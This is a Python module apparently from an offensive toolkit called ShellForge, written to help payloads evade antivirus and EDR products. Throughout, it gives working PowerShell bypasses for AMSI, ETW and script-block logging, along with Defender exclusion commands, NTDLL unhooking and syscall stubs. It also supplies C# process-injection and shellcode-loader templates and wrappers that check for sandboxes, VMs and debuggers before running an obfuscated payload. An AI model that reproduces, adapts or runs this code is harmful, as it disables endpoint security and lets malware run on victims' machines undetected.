#!/usr/bin/env python3
"""
ShellForge AV/EDR Bypass Module
Advanced evasion techniques for bypassing security products
"""

import base64
import random
import string

class AVEDRBypass:
    """Comprehensive AV/EDR bypass techniques"""
    
    # AMSI Bypass variants
    AMSI_BYPASSES = {
        "reflection": '''$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)''',
        
        "memory_patch": '''$w=Add-Type -m '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' -Name w -PassThru;$x=$w::LoadLibrary("a"+"m"+"s"+"i.dll");$y=$w::GetProcAddress($x,"A"+"m"+"s"+"i"+"S"+"c"+"a"+"n"+"B"+"u"+"f"+"f"+"e"+"r");$z=0;$w::VirtualProtect($y,5,0x40,[ref]$z);$p=[byte[]]@(0xB8,0x57,0x00,0x07,0x80,0xC3);[System.Runtime.InteropServices.Marshal]::Copy($p,0,$y,6)''',
        
        "context_patch": '''$c=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static');$c.SetValue($null,[IntPtr]::Zero)''',
        
        "force_error": '''$k='A'+'m'+'siSc'+'anBuffer';$x=[Runtime.InteropServices.Marshal];$a=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.Management.Automation.dll')};$n=$a.GetType('System.Management.Automation.AmsiUtils').GetMethod($k,[Reflection.BindingFlags]'NonPublic,Static');$n.Invoke($null,@([IntPtr]::Zero,[IntPtr]::Zero,0,[IntPtr]::Zero,[IntPtr]::Zero))'''
    }
    
    # ETW (Event Tracing for Windows) Bypass
    ETW_BYPASSES = {
        "patch": '''$etw=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance');$etwProvider=New-Object System.Diagnostics.Eventing.EventProvider([Guid]::NewGuid());$etw.SetValue($etwProvider,0)''',
        
        "memory": '''$k32=Add-Type -m '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' -Name k32 -PassThru;$ntdll=$k32::LoadLibrary("ntdll.dll");$EtwEventWrite=$k32::GetProcAddress($ntdll,"EtwEventWrite");$old=0;$k32::VirtualProtect($EtwEventWrite,1,0x40,[ref]$old);[System.Runtime.InteropServices.Marshal]::WriteByte($EtwEventWrite,0xC3)'''
    }
    
    # Script Block Logging Bypass
    SBL_BYPASS = '''$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static');$GPS=$GPF.GetValue($null);$GPS['ScriptBlockLogging']=@{};$GPS['ScriptBlockLogging'].Add('EnableScriptBlockLogging',0);$GPS['ScriptBlockLogging'].Add('EnableScriptBlockInvocationLogging',0)'''
    
    # CLM (Constrained Language Mode) Bypass
    CLM_BYPASS = '''$ExecutionContext.SessionState.LanguageMode="FullLanguage"'''
    
    # Defender Exclusion via WMI
    DEFENDER_EXCLUSIONS = {
        "path": '''Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"''',
        "extension": '''Add-MpPreference -ExclusionExtension ".ps1"''',
        "process": '''Add-MpPreference -ExclusionProcess "powershell.exe"'''
    }
    
    # Syscall stub templates (for unhooking)
    SYSCALL_STUBS = {
        "NtAllocateVirtualMemory": bytes([0x4C, 0x8B, 0xD1, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3]),
        "NtWriteVirtualMemory": bytes([0x4C, 0x8B, 0xD1, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3]),
        "NtProtectVirtualMemory": bytes([0x4C, 0x8B, 0xD1, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3]),
        "NtCreateThreadEx": bytes([0x4C, 0x8B, 0xD1, 0xB8, 0xC1, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3])
    }

    @staticmethod
    def get_random_string(length=8):
        """Generate random variable names"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    @classmethod
    def obfuscate_string(cls, s: str) -> str:
        """String concatenation obfuscation"""
        if len(s) < 3:
            return f"'{s}'"
        
        parts = []
        i = 0
        while i < len(s):
            chunk_size = random.randint(1, 3)
            parts.append(s[i:i+chunk_size])
            i += chunk_size
        
        return '+'.join(f"'{p}'" for p in parts)
    
    @classmethod
    def get_amsi_bypass(cls, method: str = "reflection", obfuscate: bool = True) -> str:
        """Get AMSI bypass code"""
        bypass = cls.AMSI_BYPASSES.get(method, cls.AMSI_BYPASSES["reflection"])
        
        if obfuscate:
            # Variable name randomization
            var_map = {
                '$a': f'${cls.get_random_string()}',
                '$b': f'${cls.get_random_string()}',
                '$c': f'${cls.get_random_string()}',
                '$x': f'${cls.get_random_string()}',
                '$y': f'${cls.get_random_string()}',
                '$z': f'${cls.get_random_string()}',
                '$p': f'${cls.get_random_string()}',
                '$w': f'${cls.get_random_string()}'
            }
            for old, new in var_map.items():
                bypass = bypass.replace(old, new)
        
        return bypass
    
    @classmethod
    def get_etw_bypass(cls, method: str = "patch", obfuscate: bool = True) -> str:
        """Get ETW bypass code"""
        bypass = cls.ETW_BYPASSES.get(method, cls.ETW_BYPASSES["patch"])
        
        if obfuscate:
            var_map = {
                '$etw': f'${cls.get_random_string()}',
                '$etwProvider': f'${cls.get_random_string()}',
                '$k32': f'${cls.get_random_string()}',
                '$ntdll': f'${cls.get_random_string()}',
                '$old': f'${cls.get_random_string()}'
            }
            for old, new in var_map.items():
                bypass = bypass.replace(old, new)
        
        return bypass
    
    @classmethod
    def get_full_bypass_chain(cls, include_amsi: bool = True, include_etw: bool = True, 
                              include_sbl: bool = True, obfuscate: bool = True) -> str:
        """Get complete bypass chain for PowerShell"""
        parts = []
        
        if include_etw:
            parts.append(f"# ETW Bypass\n{cls.get_etw_bypass(obfuscate=obfuscate)}")
        
        if include_amsi:
            parts.append(f"# AMSI Bypass\n{cls.get_amsi_bypass(obfuscate=obfuscate)}")
        
        if include_sbl:
            bypass = cls.SBL_BYPASS
            if obfuscate:
                bypass = bypass.replace('$GPF', f'${cls.get_random_string()}')
                bypass = bypass.replace('$GPS', f'${cls.get_random_string()}')
            parts.append(f"# SBL Bypass\n{bypass}")
        
        return '\n\n'.join(parts)
    
    @classmethod
    def wrap_powershell_bypass(cls, payload: str, level: str = "full") -> str:
        """Wrap PowerShell payload with bypass techniques"""
        
        if level == "none":
            return payload
        
        bypasses = []
        
        if level in ["amsi", "medium", "full", "max"]:
            bypasses.append(cls.get_amsi_bypass(method="memory_patch", obfuscate=True))
        
        if level in ["full", "max"]:
            bypasses.append(cls.get_etw_bypass(method="memory", obfuscate=True))
        
        if level == "max":
            bypasses.append(cls.SBL_BYPASS)
        
        bypass_code = ';'.join(bypasses)
        
        return f"{bypass_code};{payload}"
    
    @classmethod
    def generate_unhook_code(cls, target: str = "ntdll") -> str:
        """Generate NTDLL unhooking code (C#)"""
        return f'''
// NTDLL Unhooking - Restore original bytes
public static void UnhookNtdll()
{{
    IntPtr ntdll = LoadLibrary("{target}.dll");
    IntPtr ntdllBase = GetModuleHandle("{target}.dll");
    
    // Read clean copy from disk
    byte[] cleanNtdll = File.ReadAllBytes(@"C:\\Windows\\System32\\{target}.dll");
    
    // Parse PE headers
    int peHeader = Marshal.ReadInt32((IntPtr)(ntdllBase.ToInt64() + 0x3C));
    short numberOfSections = Marshal.ReadInt16((IntPtr)(ntdllBase.ToInt64() + peHeader + 0x6));
    IntPtr sectionHeader = (IntPtr)(ntdllBase.ToInt64() + peHeader + 0xF8);
    
    for (int i = 0; i < numberOfSections; i++)
    {{
        // Find .text section and restore
        byte[] sectionName = new byte[8];
        Marshal.Copy((IntPtr)(sectionHeader.ToInt64() + (i * 40)), sectionName, 0, 8);
        if (Encoding.ASCII.GetString(sectionName).StartsWith(".text"))
        {{
            int virtualSize = Marshal.ReadInt32((IntPtr)(sectionHeader.ToInt64() + (i * 40) + 8));
            int virtualAddress = Marshal.ReadInt32((IntPtr)(sectionHeader.ToInt64() + (i * 40) + 12));
            int rawDataPointer = Marshal.ReadInt32((IntPtr)(sectionHeader.ToInt64() + (i * 40) + 20));
            
            IntPtr textSection = (IntPtr)(ntdllBase.ToInt64() + virtualAddress);
            uint oldProtect;
            VirtualProtect(textSection, (UIntPtr)virtualSize, 0x40, out oldProtect);
            Marshal.Copy(cleanNtdll, rawDataPointer, textSection, virtualSize);
            VirtualProtect(textSection, (UIntPtr)virtualSize, oldProtect, out oldProtect);
        }}
    }}
}}'''

    @classmethod
    def generate_syscall_stub(cls, syscall_name: str) -> bytes:
        """Get raw syscall stub bytes"""
        return cls.SYSCALL_STUBS.get(syscall_name, b'')
    
    @classmethod
    def generate_injection_template(cls, technique: str = "classic") -> str:
        """Generate process injection templates"""
        
        if technique == "classic":
            return '''
// Classic Process Injection
IntPtr hProcess = OpenProcess(0x1F0FFF, false, targetPid);
IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, allocMem, shellcode, (uint)shellcode.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
'''
        
        elif technique == "apc":
            return '''
// APC Injection (Early Bird)
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\\\Windows\\\\System32\\\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
IntPtr allocMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, allocMem, shellcode, (uint)shellcode.Length, out _);
QueueUserAPC(allocMem, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
'''
        
        elif technique == "hollow":
            return '''
// Process Hollowing
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
// Unmap original image
NtUnmapViewOfSection(pi.hProcess, imageBase);
// Allocate new memory at image base
IntPtr newBase = VirtualAllocEx(pi.hProcess, imageBase, imageSize, 0x3000, 0x40);
// Write new PE image
WriteProcessMemory(pi.hProcess, newBase, peImage, peImage.Length, out _);
// Set thread context with new entry point
ResumeThread(pi.hThread);
'''
        
        elif technique == "module_stomping":
            return '''
// Module Stomping / DLL Hollowing
IntPtr hModule = LoadLibrary("C:\\\\Windows\\\\System32\\\\amsi.dll");
MODULEINFO modInfo;
GetModuleInformation(GetCurrentProcess(), hModule, out modInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO)));
uint oldProtect;
VirtualProtect(modInfo.lpBaseOfDll, modInfo.SizeOfImage, 0x40, out oldProtect);
Marshal.Copy(shellcode, 0, modInfo.lpBaseOfDll, shellcode.Length);
// Execute via callback or thread
'''
        
        return ""
    
    @classmethod
    def get_evasion_wrapper(cls, payload: str, extension: str) -> str:
        """Get evasion wrapper based on extension type"""
        
        if extension in ["powershell", "ps1"]:
            return cls._wrap_powershell_evasion(payload)
        elif extension in ["cs", "csharp"]:
            return cls._wrap_csharp_evasion(payload)
        elif extension in ["vbs", "vbscript"]:
            return cls._wrap_vbs_evasion(payload)
        elif extension in ["hta"]:
            return cls._wrap_hta_evasion(payload)
        elif extension in ["python", "py"]:
            return cls._wrap_python_evasion(payload)
        elif extension in ["bash", "sh"]:
            return cls._wrap_bash_evasion(payload)
        else:
            return payload
    
    @classmethod
    def _wrap_powershell_evasion(cls, payload: str) -> str:
        """Add PowerShell-specific evasion"""
        rand_var = cls.get_random_string()
        
        # AMSI + ETW bypass + payload
        bypass = cls.get_full_bypass_chain(obfuscate=True)
        
        # Encode payload in variable blocks
        encoded = base64.b64encode(payload.encode()).decode()
        
        return f'''
{bypass}

# Obfuscated Payload Execution
${rand_var}=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{encoded}"))
IEX ${rand_var}
'''
    
    @classmethod
    def _wrap_csharp_evasion(cls, payload: str) -> str:
        """Add C#-specific evasion (sleep, anti-debug, unhook)"""
        return f'''
// Anti-Analysis Checks
if (DateTime.Now - Process.GetCurrentProcess().StartTime < TimeSpan.FromSeconds(2))
    Thread.Sleep(5000); // Sandbox timeout evasion

// Check for debugger
if (Debugger.IsAttached || Debugger.IsLogging())
    Environment.Exit(0);

// Check domain name (sandbox detection)
if (Environment.UserDomainName.ToLower().Contains("sandbox") || 
    Environment.UserDomainName.ToLower().Contains("virus") ||
    Environment.MachineName.ToLower().Contains("malware"))
    Environment.Exit(0);

// --- PAYLOAD ---
{payload}
'''
    
    @classmethod
    def _wrap_vbs_evasion(cls, payload: str) -> str:
        """Add VBScript evasion"""
        return f'''
' Sleep for sandbox timeout
WScript.Sleep 3000

' Check for analysis tools
Set objWMI = GetObject("winmgmts:\\\\.\\root\\cimv2")
Set colProcs = objWMI.ExecQuery("Select * from Win32_Process")
For Each objProc in colProcs
    procName = LCase(objProc.Name)
    If InStr(procName, "wireshark") > 0 Or InStr(procName, "procmon") > 0 Or InStr(procName, "x64dbg") > 0 Then
        WScript.Quit
    End If
Next

' Check RAM (sandboxes often have less)
Set colCS = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
For Each objCS in colCS
    If (objCS.TotalPhysicalMemory / 1073741824) < 4 Then
        WScript.Quit
    End If
Next

' --- PAYLOAD ---
{payload}
'''
    
    @classmethod  
    def _wrap_hta_evasion(cls, payload: str) -> str:
        """Add HTA evasion"""
        return f'''<script language="VBScript">
' Sleep for sandbox timeout
Sub Sleep(ms)
    Dim start: start = Timer
    Do While Timer < start + (ms / 1000): Loop
End Sub
Sleep 3000

' Check for VM/Sandbox
Set objWMI = GetObject("winmgmts:\\\\.\\root\\cimv2")
Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
For Each objItem in colItems
    If InStr(LCase(objItem.Manufacturer), "vmware") > 0 Or _
       InStr(LCase(objItem.Manufacturer), "virtual") > 0 Or _
       InStr(LCase(objItem.Model), "virtual") > 0 Then
        window.close
    End If
Next

' --- PAYLOAD ---
{payload}
</script>'''
    
    @classmethod
    def _wrap_python_evasion(cls, payload: str) -> str:
        """Add Python evasion"""
        return f'''
import os, sys, platform, time, subprocess

# Sleep to evade sandbox timeout
time.sleep(3)

# Check for VM artifacts
def check_vm():
    try:
        # Check DMI for VM strings
        dmi = subprocess.check_output(['dmidecode', '-s', 'system-manufacturer'], stderr=subprocess.DEVNULL).decode().lower()
        if any(x in dmi for x in ['vmware', 'virtualbox', 'qemu', 'xen', 'microsoft corporation']):
            sys.exit(0)
    except:
        pass
    
    # Check MAC prefix (common VM prefixes)
    try:
        from uuid import getnode
        mac = ':'.join(['{{:02x}}'.format((getnode() >> i) & 0xff) for i in range(0,48,8)][::-1])
        vm_macs = ['00:0c:29', '00:50:56', '08:00:27', '52:54:00']
        if any(mac.lower().startswith(prefix) for prefix in vm_macs):
            sys.exit(0)
    except:
        pass

# Check for analysis tools
def check_analysis():
    analysis_procs = ['wireshark', 'tcpdump', 'strace', 'ltrace', 'gdb', 'ida']
    try:
        procs = subprocess.check_output(['ps', 'aux'], stderr=subprocess.DEVNULL).decode().lower()
        if any(p in procs for p in analysis_procs):
            sys.exit(0)
    except:
        pass

check_vm()
check_analysis()

# --- PAYLOAD ---
{payload}
'''
    
    @classmethod
    def _wrap_bash_evasion(cls, payload: str) -> str:
        """Add Bash evasion"""
        return f'''#!/bin/bash

# Sleep to evade sandbox
sleep 3

# Check for VM
check_vm() {{
    if command -v dmidecode &>/dev/null; then
        manufacturer=$(sudo dmidecode -s system-manufacturer 2>/dev/null | tr '[:upper:]' '[:lower:]')
        if [[ "$manufacturer" == *"vmware"* ]] || [[ "$manufacturer" == *"virtualbox"* ]] || [[ "$manufacturer" == *"qemu"* ]]; then
            exit 0
        fi
    fi
    
    # Check for common VM files
    if [ -f /sys/class/dmi/id/product_name ]; then
        product=$(cat /sys/class/dmi/id/product_name | tr '[:upper:]' '[:lower:]')
        if [[ "$product" == *"virtual"* ]]; then
            exit 0
        fi
    fi
}}

# Check for analysis tools
check_analysis() {{
    analysis_procs="wireshark tcpdump strace ltrace gdb ida radare2"
    for proc in $analysis_procs; do
        if pgrep -x "$proc" > /dev/null; then
            exit 0
        fi
    done
}}

check_vm
check_analysis

# --- PAYLOAD ---
{payload}
'''

    @classmethod
    def generate_loader_template(cls, shellcode_var: str = "buf", technique: str = "virtualalloc") -> str:
        """Generate shellcode loader templates (C#)"""
        
        if technique == "virtualalloc":
            return f'''
// VirtualAlloc + Delegate Execution
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint){shellcode_var}.Length, 0x3000, 0x40);
Marshal.Copy({shellcode_var}, 0, mem, {shellcode_var}.Length);
IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
'''
        
        elif technique == "ntcreate":
            return f'''
// NtCreateSection + NtMapViewOfSection (avoiding hooked APIs)
IntPtr sectionHandle;
long maxSize = {shellcode_var}.Length;
NtCreateSection(out sectionHandle, 0x0F001F, IntPtr.Zero, ref maxSize, 0x40, 0x08000000, IntPtr.Zero);

IntPtr localAddr = IntPtr.Zero;
IntPtr remoteAddr = IntPtr.Zero;
ulong viewSize = 0;

NtMapViewOfSection(sectionHandle, GetCurrentProcess(), ref localAddr, UIntPtr.Zero, UIntPtr.Zero, out _, ref viewSize, 2, 0, 0x04);
Marshal.Copy({shellcode_var}, 0, localAddr, {shellcode_var}.Length);

IntPtr hThread;
NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, GetCurrentProcess(), localAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
'''
        
        elif technique == "callback":
            return f'''
// Callback-based execution (EnumWindows, etc.)
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint){shellcode_var}.Length, 0x3000, 0x40);
Marshal.Copy({shellcode_var}, 0, mem, {shellcode_var}.Length);
EnumWindows(mem, IntPtr.Zero);
'''
        
        elif technique == "fiber":
            return f'''
// Fiber execution
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint){shellcode_var}.Length, 0x3000, 0x40);
Marshal.Copy({shellcode_var}, 0, mem, {shellcode_var}.Length);
IntPtr fiber = ConvertThreadToFiber(IntPtr.Zero);
IntPtr shellcodeFiber = CreateFiber(0, mem, IntPtr.Zero);
SwitchToFiber(shellcodeFiber);
'''
        
        return ""
